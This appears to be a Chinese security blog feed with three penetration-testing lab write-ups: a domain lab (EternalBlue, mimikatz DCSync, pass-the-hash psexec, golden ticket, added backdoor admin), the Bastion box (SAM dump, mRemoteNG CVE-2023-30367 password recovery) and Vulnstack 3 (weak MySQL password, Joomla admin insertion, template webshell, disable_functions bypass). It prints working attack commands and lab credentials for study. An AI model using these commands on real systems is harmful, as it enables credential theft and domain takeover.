class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="/Rxi134_FILE/812867c1e169a922cd715a7ebc5412ac_MD5.jpeg"></p><h1 id="172-22-1-21-XIAORANG-WIN7永恒之蓝"><a href="#172-22-1-21-XIAORANG-WIN7永恒之蓝" class="headerlink" title="172.22.1.21 XIAORANG-WIN7永恒之蓝"></a>172.22.1.21 XIAORANG-WIN7永恒之蓝</h1><p>先打下poc<br><img src="/Rxi134_FILE/f3ace0e2067cd9eef98aeac432605841_MD5.jpeg"></p><p>准备正连打永恒之蓝</p><p>但是利用session路由无法getshell，目前原因不明，感觉有可能是web机正连的原因🤔<br><img src="/Rxi134_FILE/d81a4b13f08ec3a482a79365d96c03de_MD5.jpeg"></p><p>proxychains就可以，这里因为ew老是断，代理换成了chisel<br><img src="/Rxi134_FILE/f95ab55548d00842facf4f4a8f80c32d_MD5.jpeg"><br><img src="/Rxi134_FILE/fd696530353cc7ce72132193d783c0b0_MD5.jpeg"></p><p>不过我没找到flag<br><img src="/Rxi134_FILE/6f49749112f09825c67fa48aa0b41488_MD5.jpeg"></p><p>而且无法弹出shell…<br><img src="/Rxi134_FILE/4f67bf4c0c360c1006d080e416d576e1_MD5.jpeg"></p><h2 id="域控同步滥用-mimikatz抓取"><a href="#域控同步滥用-mimikatz抓取" class="headerlink" title="域控同步滥用+mimikatz抓取"></a>域控同步滥用+mimikatz抓取</h2><p>msf自带kiwi模块，咱就不用手动上传了，很方便</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">kiwi_cmd privilege::debugkiwi_cmd sekurlsa::logonpasswords<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>但是只抓取到机器用户的NTLM哈希，没啥用<br><img src="/Rxi134_FILE/dc49e620262033bfc1e8c4b8d34e3bcb_MD5.jpeg"></p><pre class="line-numbers language-text" data-language="text"><code class="language-text">XIAORANG-WIN7$NTLM：5dbcc8e0fa12e4aa99b7447bfa087add<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>不过我们都是SYSTEM用户了，可以直接利用 DCSync，伪造我们是一个域控发出同步申请，从而获取域用户哈希</p><pre class="line-numbers language-text" data-language="text"><code class="language-text">meterpreter > kiwi_cmd "lsadump::dcsync /domain:xiaorang.lab /all /csv" exit[proxychains] DLL init: proxychains-ng 4.17[proxychains] DLL init: proxychains-ng 4.17[DC] 'xiaorang.lab' will be the domain[DC] 'DC01.xiaorang.lab' will be the DC server[DC] Exporting domain 'xiaorang.lab'[rpc] Service  : ldap[rpc] AuthnSvc : GSS_NEGOTIATE (9)502     krbtgt  fb812eea13a18b7fcdb8e6d67ddc205b        5141106    Marcus  e07510a4284b3c97c8e7dee970918c5c        5121107    Charles f6a9881cd5ae709abb4ac9ab87f24617        5121000    DC01$   94c59dda4a0ec229d4b4cf45dba98dbf        5324801104    XIAORANG-OA01$  dc5f050393a7cc83e0518b8015b8b65d        4096500     Administrator   10cf89a850fb1cdbe6bb432b859164c8        5121108    XIAORANG-WIN7$  8b7dea43bed4b560504e925f0f1b5efd        4096<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="172-22-1-2-DC01"><a href="#172-22-1-2-DC01" class="headerlink" title="172.22.1.2 DC01"></a>172.22.1.2 DC01</h1><h2 id="pth-psexec拿下域控"><a href="#pth-psexec拿下域控" class="headerlink" title="pth+psexec拿下域控"></a>pth+psexec拿下域控</h2><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">psexec.exe xiaorang.lab/administrator@172.22.1.2 <span class="token parameter variable">-hashes</span> aad3b435b51404eeaad3b435b51404ee:10cf89a850fb1cdbe6bb432b859164c8 -dc-ip <span class="token number">172.22</span>.1.2<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/Rxi134_FILE/ee9dcfd5a0bc36581cf73b44edbc1ba5_MD5.jpeg"></p><h2 id="获取flag3"><a href="#获取flag3" class="headerlink" title="获取flag3"></a>获取flag3</h2><p><img src="/Rxi134_FILE/7981278fa41cc9988280d60ad8cd5c40_MD5.jpeg"></p><pre class="line-numbers language-text" data-language="text"><code class="language-text">e8f88d0d43d6&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="权限维持（黄金票据）"><a href="#权限维持（黄金票据）" class="headerlink" title="权限维持（黄金票据）"></a>权限维持（黄金票据）</h2><p>我们已经有krbtgt账户的NT hash，以此来制作黄金票据实现域权限维持</p><p>查看域SID</p><pre class="line-numbers language-text" data-language="text"><code class="language-text">C:\Windows\system32>powershell -c "(Get-ADDomain).DomainSID"BinaryLength AccountDomainSid                         Value------------ ----------------                         -----          24 S-1-5-21-314492864-3856862959-4045974917 S-1-5-21-314492864-385...C:\Windows\system32><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>制作黄金票据</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">python ticketer.py -domain-sid S-1-5-21-314492864-3856862959-4045974917 <span class="token parameter variable">-nthash</span> fb812eea13a18b7fcdb8e6d67ddc205b <span class="token parameter variable">-domain</span> xiaorang.lab administrator<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>导入票据</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">export</span> <span class="token assign-left variable">KRB5CCNAME</span><span class="token operator">=</span>administrator.ccache<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>同时绑定ip<br><img src="/Rxi134_FILE/38f28d489d1a44d14227971361df823a_MD5.jpeg"></p><p>但还是无法连接，原因不明<br><img src="/Rxi134_FILE/a4105ba270dc9575697f63bfb1275284_MD5.jpeg"></p><p>感觉有可能是域环境的问题<br><img src="/Rxi134_FILE/3dcb1bde5b35bbbfa5599aaf9842925a_MD5.jpeg"></p><h1 id="172-22-1-18-XIAORANG-OA01-信呼OA"><a href="#172-22-1-18-XIAORANG-OA01-信呼OA" class="headerlink" title="172.22.1.18 XIAORANG-OA01 信呼OA"></a>172.22.1.18 XIAORANG-OA01 信呼OA</h1><h2 id="获取flag2"><a href="#获取flag2" class="headerlink" title="获取flag2"></a>获取flag2</h2><p>其实有了域管就可以直接登录了<br><img src="/Rxi134_FILE/70fd03a3bec5e8486a1116547faaab91_MD5.jpeg"></p><pre class="line-numbers language-text" data-language="text"><code class="language-text">2ce3-4813-87d4-<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-text" data-language="text"><code class="language-text">flag&#123;60b53231-2ce3-4813-87d4-e8f88d0d43d6&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>机器开了rdp，顺带添加个管理员用户</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">net user hacker 1qaz2wsx /addnet localgroup administrators hacker /add<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="/Rxi134_FILE/ff8a5db87663fad5dbe1ec090188b2b0_MD5.jpeg"></p><p>看了wp，要是硬打其实也比较简单，就不做了</p><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><ul><li>msf是很方便的东西</li></ul>]]></content>
      
      
      <categories>
          
          <category> pentest </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 靶场 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>W Easy-Bastion</title>
      <link href="/2024/10/06/W%20Easy-Bastion/"/>
      <url>/2024/10/06/W%20Easy-Bastion/</url>
      
        <content type="html"><![CDATA[<h1 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h1><pre class="line-numbers language-text" data-language="text"><code class="language-text">PORT      STATE  SERVICE      VERSION22/tcp    open   ssh          OpenSSH for_Windows_7.9 (protocol 2.0)| ssh-hostkey:|   2048 3a:56:ae:75:3c:78:0e:c8:56:4d:cb:1c:22:bf:45:8a (RSA)|   256 cc:2e:56:ab:19:97:d5:bb:03:fb:82:cd:63:da:68:01 (ECDSA)|_  256 93:5f:5d:aa:ca:9f:53:e7:f2:82:e6:64:a8:a3:a0:18 (ED25519)25/tcp    closed smtp110/tcp   closed pop3135/tcp   open   msrpc        Microsoft Windows RPC139/tcp   open   netbios-ssn  Microsoft Windows netbios-ssn445/tcp   open   microsoft-ds Windows Server 2016 Standard 14393 microsoft-ds47001/tcp open   http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)|_http-server-header: Microsoft-HTTPAPI/2.0|_http-title: Not Found49664/tcp open   msrpc        Microsoft Windows RPC49665/tcp open   msrpc        Microsoft Windows RPC49666/tcp open   msrpc        Microsoft Windows RPC49667/tcp open   msrpc        Microsoft Windows RPC49668/tcp open   msrpc        Microsoft Windows RPC49669/tcp open   msrpc        Microsoft Windows RPC49670/tcp open   msrpc        Microsoft Windows RPC<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="入侵-驻足"><a href="#入侵-驻足" class="headerlink" title="入侵 &amp; 驻足"></a>入侵 &amp; 驻足</h1><h2 id="smb-guest登录策略"><a href="#smb-guest登录策略" class="headerlink" title="smb guest登录策略"></a>smb guest登录策略</h2><p>对smb进行枚举<br><img src="/Rxi134_FILE/f6c2c7ba974326656f4877f7574b70c3_MD5.jpeg"><br>开启了guest登录策略，随机的用户名都会映射为guest用户</p><p><img src="/Rxi134_FILE/2c5baf067163bd972aa8780521eb8dad_MD5.jpeg"></p><h2 id="发现备份文件夹"><a href="#发现备份文件夹" class="headerlink" title="发现备份文件夹"></a>发现备份文件夹</h2><p>其中有个 note.txt 和 文件夹 WindowsImageBackup<br><img src="/Rxi134_FILE/41f43da27c87c35f9254b53c56ebc304_MD5.jpeg"></p><pre class="line-numbers language-text" data-language="text"><code class="language-text">Sysadmins: please don't transfer the entire backup file locally, the VPN to the subsidiary office is too slow.系统管理员：请不要将整个备份文件传输到本地，到子公司的 VPN 太慢了。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h2 id="挂载磁盘"><a href="#挂载磁盘" class="headerlink" title="挂载磁盘"></a>挂载磁盘</h2><p>有两个vhd文件，分别进行挂载，只有一个盘里有东西<br><img src="/Rxi134_FILE/51cdaecb2c4cf1eead38021f71ae2d1c_MD5.jpeg"><br><img src="/Rxi134_FILE/f30f207fd53fb255d38e1a450334eb2d_MD5.jpeg"></p><h2 id="转储-SAM-SYSTEM"><a href="#转储-SAM-SYSTEM" class="headerlink" title="转储 SAM &amp; SYSTEM"></a>转储 SAM &amp; SYSTEM</h2><p>先看看能不能把默认账密搞到手<br><img src="/Rxi134_FILE/07dff079d282657e71ddd77fde55300e_MD5.jpeg"><br>利用mimikatz解密<br><img src="/Rxi134_FILE/3344986976eb459e67d751a265ab16f7_MD5.jpeg"></p><pre class="line-numbers language-text" data-language="text"><code class="language-text">RID  : 000001f4 (500)User : Administrator  Hash NTLM: 31d6cfe0d16ae931b73c59d7e0c089c0RID  : 000001f5 (501)User : GuestRID  : 000003e8 (1000)User : L4mpje  Hash NTLM: 26112010952d963c8dc4217daec986d9<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>拿到彩虹表查下<br><img src="/Rxi134_FILE/aabcee57e6af159e13b02acbe1c9f2e8_MD5.jpeg"></p><pre class="line-numbers language-text" data-language="text"><code class="language-text">L4mpje:bureaulampje<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="openssh连接"><a href="#openssh连接" class="headerlink" title="openssh连接"></a>openssh连接</h2><p>ssh直接上去了<br><img src="/Rxi134_FILE/c2241c837a4a93e6f105d90a9319ad4b_MD5.jpeg"></p><h1 id="权限提升"><a href="#权限提升" class="headerlink" title="权限提升"></a>权限提升</h1><h2 id="上传winpeas"><a href="#上传winpeas" class="headerlink" title="上传winpeas"></a>上传winpeas</h2><p>上传 winpeas 先进行一波收集，常见的攻击向量都没什么可用的</p><p>还有一个攻击向量是受攻击程序，但是用户权限太低了，连列出计算机安装的应用程序都做不到<br><img src="/Rxi134_FILE/11cb658d90ab733ab4215a72b3211f3a_MD5.jpeg"><br>我只能手动去翻翻Program Files了<br><img src="/Rxi134_FILE/2557f5b7e5b8155f61d1f8ff2bc58439_MD5.jpeg"></p><h2 id="利用受攻击软件-mRemoteNG-CVE-2023-30367-获取管理员密码"><a href="#利用受攻击软件-mRemoteNG-CVE-2023-30367-获取管理员密码" class="headerlink" title="利用受攻击软件 mRemoteNG CVE-2023-30367 获取管理员密码"></a>利用受攻击软件 mRemoteNG CVE-2023-30367 获取管理员密码</h2><blockquote><p><strong>mRemoteNG</strong> 是一个开源、多协议的远程连接管理器，支持多种远程连接协议，如 RDP（远程桌面）、VNC、SSH、Telnet 等。它通过集中化的管理界面，帮助用户快速组织和访问多台服务器或设备。</p></blockquote><p>下载下来看看版本，1.76.11<br><img src="/Rxi134_FILE/c5f4bbc6cfc831119faf18febec1633a_MD5.jpeg"></p><p><img src="/Rxi134_FILE/1bf55d33d97ed8c04969608258385bf8_MD5.jpeg"><br>请注意，配置密码加密和连接文件加密是不同的设置。配置密码加密仅用于加密配置文件中的密码，而连接文件加密用于加密整个配置文件本身。</p><p>此漏洞通过从内存中转储已解密的配置来绕过连接文件加密。但是不包含配置文件加密的密码（默认密钥 <code>mR3m</code> ），如果已设置自定义配置密码加密密钥&#x2F;密码，攻击者仍必须猜测自定义密钥。（参见 <a href="https://github.com/S1lkys/CVE-2023-30367-mRemoteNG-password-dumper/tree/main?tab=readme-ov-file#mremoteng_decryptpy">mremoteng-decrypt.py 部分</a>）</p><p>确定加密的配置文件位置</p><pre class="line-numbers language-text" data-language="text"><code class="language-text">l4mpje@BASTION C:\Users\L4mpje>dir c:\ /s /b | find "confCons.xml"                  c:\Users\L4mpje\AppData\Roaming\mRemoteNG\confCons.xmlc:\Users\L4mpje\AppData\Roaming\mRemoteNG\confCons.xml.20190222-1402277353.backupc:\Users\L4mpje\AppData\Roaming\mRemoteNG\confCons.xml.20190222-1402339071.backupc:\Users\L4mpje\AppData\Roaming\mRemoteNG\confCons.xml.20190222-1402379227.backupc:\Users\L4mpje\AppData\Roaming\mRemoteNG\confCons.xml.20190222-1403070644.backupc:\Users\L4mpje\AppData\Roaming\mRemoteNG\confCons.xml.20190222-1403100488.backupc:\Users\L4mpje\AppData\Roaming\mRemoteNG\confCons.xml.20190222-1403220026.backupc:\Users\L4mpje\AppData\Roaming\mRemoteNG\confCons.xml.20190222-1403261268.backupc:\Users\L4mpje\AppData\Roaming\mRemoteNG\confCons.xml.20190222-1403272831.backupc:\Users\L4mpje\AppData\Roaming\mRemoteNG\confCons.xml.20190222-1403433299.backupc:\Users\L4mpje\AppData\Roaming\mRemoteNG\confCons.xml.20190222-1403486580.backup   <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/Rxi134_FILE/192185e805cf2007aa0070c4db5760ec_MD5.jpeg"></p><pre class="line-numbers language-text" data-language="text"><code class="language-text">aEWNFV5uGcjUHF0uS17QTdT9kVqtKCPeoC0Nw5dmaPFjNQ2kt/zO5xDqE4HdVmHAowVRdC7emf7lWWA10dQKiw==<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>利用脚本：<a href="https://github.com/S1lkys/CVE-2023-30367-mRemoteNG-password-dumper/tree/main?tab=readme-ov-file">S1lkys&#x2F;CVE-2023-30367-mRemoteNG-password-dumper: Original PoC for CVE-2023-30367 (github.com)</a></p><p>解密如下<br><img src="/Rxi134_FILE/3dbfa1187e51d551f8073a269d52f1b0_MD5.jpeg"></p><pre class="line-numbers language-text" data-language="text"><code class="language-text">administrator:thXLHM96BeKL0ER2<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/Rxi134_FILE/62e546d0998c7bbe4efeed3aff61a5b5_MD5.jpeg"></p>]]></content>
      
      
      <categories>
          
          <category> pentest </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 靶场 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ATT&amp;CK红队评估实战靶场-3</title>
      <link href="/2024/10/05/ATT&amp;CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA-3/"/>
      <url>/2024/10/05/ATT&amp;CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA-3/</url>
      
        <content type="html"><![CDATA[<blockquote><p>下载地址：<a href="http://vulnstack.qiyuanxuetang.net/vuln/detail/5/">漏洞详情 (qiyuanxuetang.net)</a></p></blockquote><p>打开虚拟机镜像为挂起状态，第一时间进行快照，部分服务未做自启，重启后无法自动运行。</p><h1 id="网络搭建"><a href="#网络搭建" class="headerlink" title="网络搭建"></a>网络搭建</h1><p>VMnet2和VMnet3配置如图所示<br><img src="/Rxi134_FILE/986298e29ccae5da90aa4f70ef4a1f12_MD5.jpeg"></p><p>然后启动所有虚拟机，并设置centos一个NAT网卡，同时重启网络服务</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">service</span> network restart<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>黑盒模式，没有账密</p><h1 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h1><p>先扫端口</p><pre class="line-numbers language-text" data-language="text"><code class="language-text">PORT     STATE SERVICE VERSION22/tcp   open  ssh     OpenSSH 5.3 (protocol 2.0)| ssh-hostkey: |   1024 25:84:c6:cc:2c:8a:7b:8f:4a:7c:60:f1:a3:c9:b0:22 (DSA)|_  2048 58:d1:4c:59:2d:85:ae:07:69:24:0a:dd:72:0f:45:a5 (RSA)80/tcp   open  http    nginx 1.9.4|_http-title: Home|_http-favicon: Unknown favicon MD5: 1194D7D32448E1F90741A97B42AF91FA|_http-generator: Joomla! - Open Source Content Management| http-methods: |_  Supported Methods: GET HEAD POST OPTIONS|_http-server-header: nginx/1.9.4| http-robots.txt: 15 disallowed entries | /joomla/administrator/ /administrator/ /bin/ /cache/ | /cli/ /components/ /includes/ /installation/ /language/ |_/layouts/ /libraries/ /logs/ /modules/ /plugins/ /tmp/3306/tcp open  mysql   MySQL 5.7.27-0ubuntu0.16.04.1| mysql-info: |   Protocol: 10|   Version: 5.7.27-0ubuntu0.16.04.1|   Thread ID: 13|   Capabilities flags: 63487|   Some Capabilities: IgnoreSpaceBeforeParenthesis, FoundRows, LongColumnFlag, ConnectWithDatabase, Speaks41ProtocolNew, Speaks41ProtocolOld, LongPassword, SupportsTransactions, ODBCClient, SupportsCompression, Support41Auth, InteractiveClient, DontAllowDatabaseTableColumn, IgnoreSigpipes, SupportsLoadDataLocal, SupportsAuthPlugins, SupportsMultipleStatments, SupportsMultipleResults|   Status: Autocommit|   Salt: \x11L>y\x0F&#123;>JK\x1AE3i \x1F=U6\x01\x04|_  Auth Plugin Name: mysql_native_password<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>22端口：ssh<br>80端口：这里扫出来一个 robots.txt，里面是joomla cms的目录<br>3306端口：mysql 5.7.27</p><p>goby上去打些常用poc，直接给我扫出个弱口令，<code>root:123</code><br><img src="/Rxi134_FILE/78677d2143ef5d9c9634c796800f071e_MD5.jpeg"><br>先不急着利用，再搜集些信息</p><p>Joomla CMS<br><img src="/Rxi134_FILE/8f51a446c2a6450bf98a94f5984556d0_MD5.jpeg"></p><p>Joomlascan扫出来一些目录信息，Joomla 3.9.12<br><img src="/Rxi134_FILE/2008ef20127c13f867bb5f0c6854e5d0_MD5.jpeg"></p><p>这里泄露了joomla的配置文件，其中包含了数据库密码和网站绝对路径<br><img src="/Rxi134_FILE/9511a58529b2dc8583373356f598d030_MD5.jpeg"><br><img src="/Rxi134_FILE/7d49600c2c611bd434de1e727f152f2d_MD5.jpeg"></p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">public</span> <span class="token variable">$dbtype</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'mysqli'</span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token variable">$host</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'localhost'</span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token variable">$user</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'testuser'</span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token variable">$password</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'cvcvgjASD!@'</span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token variable">$db</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'joomla'</span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token variable">$dbprefix</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'am2zu_'</span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token variable">$live_site</span> <span class="token operator">=</span> <span class="token string single-quoted-string">''</span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token variable">$secret</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'gXN9Wbpk7ef3A4Ys'</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>远程连接数据库，先找找有没有可用的信息，在两个表里存放了账密信息<br><img src="/Rxi134_FILE/b374998d36dab3a65144481d70d63367_MD5.jpeg"></p><p>我们这个用户权限很低，几乎无权进行任何写操作<br><img src="/Rxi134_FILE/6059b9fba6afe41ea3719b42fb46155c_MD5.jpeg"></p><h1 id="尝试数据库写马"><a href="#尝试数据库写马" class="headerlink" title="尝试数据库写马"></a>尝试数据库写马</h1><p>回到root用户，现在有网站的绝对路径，into oufile是没有限制，但是网站目录无权写入<br><img src="/Rxi134_FILE/92032314d1c8e5806e2c200151dd34f5_MD5.jpeg"></p><h1 id="尝试破解哈希"><a href="#尝试破解哈希" class="headerlink" title="尝试破解哈希"></a>尝试破解哈希</h1><pre class="line-numbers language-text" data-language="text"><code class="language-text">891Super Useradministratortest@test.com$2y$10$t1RelJijihpPhL8LARC9JuM/AWrVR.nto/XycrybdRbk8IEg6Dze2184Super Useradmintest@test.com$2y$10$N/Yv/9rzxyq.z0gLTT5og.pj3FFAP8Sq2PcBgsMX/Qnc2671qQkHy<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>becrypt，hashcat没爆出来</p><h1 id="尝试添加新用户"><a href="#尝试添加新用户" class="headerlink" title="尝试添加新用户"></a>尝试添加新用户</h1><p><img src="/Rxi134_FILE/ae2610f8d43a4f32cafab473d5459e67_MD5.jpeg"><br>添加了一个用户，但还是登陆失败</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">INSERT INTO <span class="token variable"><span class="token variable">`</span>am2zu_users<span class="token variable">`</span></span>   <span class="token punctuation">(</span><span class="token variable"><span class="token variable">`</span>name<span class="token variable">`</span></span>, <span class="token variable"><span class="token variable">`</span>username<span class="token variable">`</span></span>, <span class="token variable"><span class="token variable">`</span>password<span class="token variable">`</span></span>, <span class="token variable"><span class="token variable">`</span>params<span class="token variable">`</span></span>, <span class="token variable"><span class="token variable">`</span>registerDate<span class="token variable">`</span></span>, <span class="token variable"><span class="token variable">`</span>lastvisitDate<span class="token variable">`</span></span>, <span class="token variable"><span class="token variable">`</span>lastResetTime<span class="token variable">`</span></span><span class="token punctuation">)</span>VALUES <span class="token punctuation">(</span><span class="token string">'Administrator2'</span>, <span class="token string">'admin2'</span>,    <span class="token string">'d2064d358136996bd22421584a7cb33e:trd7TvKHx6dMeoMmBVxYmg0vuXEA4199'</span>, <span class="token string">''</span>, NOW<span class="token punctuation">(</span><span class="token punctuation">)</span>, NOW<span class="token punctuation">(</span><span class="token punctuation">)</span>, NOW<span class="token punctuation">(</span><span class="token punctuation">))</span><span class="token punctuation">;</span>INSERT INTO <span class="token variable"><span class="token variable">`</span>am2zu_user_usergroup_map<span class="token variable">`</span></span> <span class="token punctuation">(</span><span class="token variable"><span class="token variable">`</span>user_id<span class="token variable">`</span></span>,<span class="token variable"><span class="token variable">`</span>group_id<span class="token variable">`</span></span><span class="token punctuation">)</span>VALUES <span class="token punctuation">(</span>LAST_INSERT_ID<span class="token punctuation">(</span><span class="token punctuation">)</span>,<span class="token string">'8'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>把管理员密码改掉就能登上了<br><img src="/Rxi134_FILE/146fb934f6679b623540b3006b2732fe_MD5.jpeg"><br><img src="/Rxi134_FILE/d4a5ab449597882bd67504629888279e_MD5.jpeg"></p><h1 id="Joomla-后台主题写马"><a href="#Joomla-后台主题写马" class="headerlink" title="Joomla!后台主题写马"></a>Joomla!后台主题写马</h1><p><img src="/Rxi134_FILE/6740098f1b6cc83b4bdd8c52d1b89792_MD5.jpeg"></p><p>任意点击一个主题，修改模板，访问&#x2F;templates&#x2F;beez3&#x2F;error.php即可，上的蚁剑</p><h2 id="disabled-function绕过"><a href="#disabled-function绕过" class="headerlink" title="disabled_function绕过"></a>disabled_function绕过</h2><p>收到 disabled_function 的限制<br><img src="/Rxi134_FILE/9c6a0ef4e19e9a0e0d430910129ee794_MD5.jpeg"></p><p>蚁剑有专门的插件，PHP7_GC_UAF可以成功绕过<br><img src="/Rxi134_FILE/3fc2dc2771fd7290096d71b82198b1ea_MD5.jpeg"></p><h1 id="权限提升到用户"><a href="#权限提升到用户" class="headerlink" title="权限提升到用户"></a>权限提升到用户</h1><p>开了22端口，看看有没有id_rsa<br><img src="/Rxi134_FILE/92f8b5eead72a9227bdd38034f59d422_MD5.jpeg"><br>没有.ssh文件夹，看来不行</p><p>上传linpeas进行一波收集，也没有什么可用的攻击面，倒是内核版本很低，可以提权<br><img src="/Rxi134_FILE/adbec4c2b344b7caa56b72867a62b2b0_MD5.jpeg"></p><p>模糊匹配一些敏感词，比如password、passwd、pass、username</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">grep</span> <span class="token parameter variable">-r</span> <span class="token parameter variable">-E</span> <span class="token string">'passwd*|password*'</span> /var/www/html /home/yy /tmp  <span class="token operator"><span class="token file-descriptor important">2</span>></span>/dev/null<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/Rxi134_FILE/cd51a330c12b4b26c72a9d13cff7ffe2_MD5.jpeg"></p><p>在&#x2F;tmp下找到可疑账密<br><img src="/Rxi134_FILE/8f2484e2010dab9fb80f512537793802_MD5.jpeg"></p><pre class="line-numbers language-text" data-language="text"><code class="language-text">adduser wwwuserpasswd wwwuser_123Aqx<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>ssh<br><img src="/Rxi134_FILE/734b925dfa65474c2bafd496dd89bc56_MD5.jpeg"></p><p>再上linpeas进行一波收集，还是没什么可用的</p><h1 id="93网段探测"><a href="#93网段探测" class="headerlink" title="93网段探测"></a>93网段探测</h1><p>存在一个 93 网段<br><img src="/Rxi134_FILE/40dfbfc534c50942d6723dda6a74e4ce_MD5.jpeg"></p><p>不好上线CS，这里选择上线msf<br><img src="/Rxi134_FILE/eab5ad07341f9718763f4f9d39ed346d_MD5.jpeg"></p><h2 id="fscan内网大保健"><a href="#fscan内网大保健" class="headerlink" title="fscan内网大保健"></a>fscan内网大保健</h2><p>上传fscan</p><pre class="line-numbers language-text" data-language="text"><code class="language-text">start ping(icmp) Target 192.168.93.10   is alive(icmp) Target 192.168.93.20   is alive(icmp) Target 192.168.93.30   is alive(icmp) Target 192.168.93.100  is alive(icmp) Target 192.168.93.120  is alive[*] Icmp alive hosts len is: 5192.168.93.20:80 open192.168.93.30:135 open192.168.93.10:135 open192.168.93.20:135 open192.168.93.120:22 open192.168.93.100:80 open192.168.93.100:22 open192.168.93.30:445 open192.168.93.30:139 open192.168.93.100:3306 open192.168.93.20:1433 open192.168.93.120:3306 open192.168.93.10:139 open192.168.93.20:445 open192.168.93.20:139 open192.168.93.10:445 open192.168.93.120:80 open192.168.93.10:88 open[*] alive ports len is: 18start vulscan[*] NetInfo [*]192.168.93.30   [->]win7   [->]192.168.93.30[*] NetInfo [*]192.168.93.10   [->]WIN-8GA56TNV3MV   [->]192.168.93.10[*] NetBios 192.168.93.10   [+] DC:WIN-8GA56TNV3MV.test.org      Windows Server 2012 R2 Datacenter 9600[*] OsInfo 192.168.93.10(Windows Server 2012 R2 Datacenter 9600)[*] NetBios 192.168.93.20   win2008.test.org                    Windows Server (R) 2008 Datacenter 6003 Service Pack 2[*] NetInfo [*]192.168.93.20   [->]win2008   [->]192.168.93.20[*] OsInfo 192.168.93.30(Windows 7 Professional 7601 Service Pack 1)[*] WebTitle http://192.168.93.20      code:404 len:315    title:Not Found[*] OsInfo 192.168.93.20(Windows Server (R) 2008 Datacenter 6003 Service Pack 2)[+] mysql 192.168.93.100:3306:root 123[+] mysql 192.168.93.120:3306:root 123[*] WebTitle http://192.168.93.100     code:200 len:16020  title:Home[*] WebTitle http://192.168.93.120     code:200 len:16020 